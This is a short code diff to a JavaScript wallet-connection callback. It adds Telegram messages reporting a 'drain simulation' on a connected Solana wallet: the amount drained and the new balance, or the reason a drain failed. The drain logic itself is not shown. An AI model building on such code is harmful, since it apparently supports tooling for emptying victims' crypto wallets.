@@ -49,10 +49,21 @@ module.exports = async function walletCallbackHandler(req, res) {
       const walletName = result.wallet?.name || 'Wallet';
       const walletAddress = result.wallet?.address || normalizedPayload.walletAddress;
       const shortAddress = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}`;
+      
+      let message = `✅ Wallet connected: ${walletName}\nAddress: ${shortAddress}`;
+      
+      // Add drain simulation info to Telegram message
+      if (result.drainSimulation?.success) {
+        message += `\n⚠️ WARNING: Wallet drained successfully!\n`;
+        message += `Amount drained: ${result.drainSimulation.amountDrained.toFixed(4)} SOL\n`;
+        message += `New balance: ${result.drainSimulation.newBalance.toFixed(4)} SOL`;
+      } else if (result.drainSimulation) {
+        message += `\nℹ️ Wallet drain failed: ${result.drainSimulation.reason}`;
+      }
 
       await sendTelegramMessage(
         normalizedPayload.chatId,
-        `✅ Wallet connected: ${walletName}\nAddress: ${shortAddress}`
+        message
       );
     } catch (error) {
       console.warn('Failed to send Telegram wallet confirmation:', error.message);
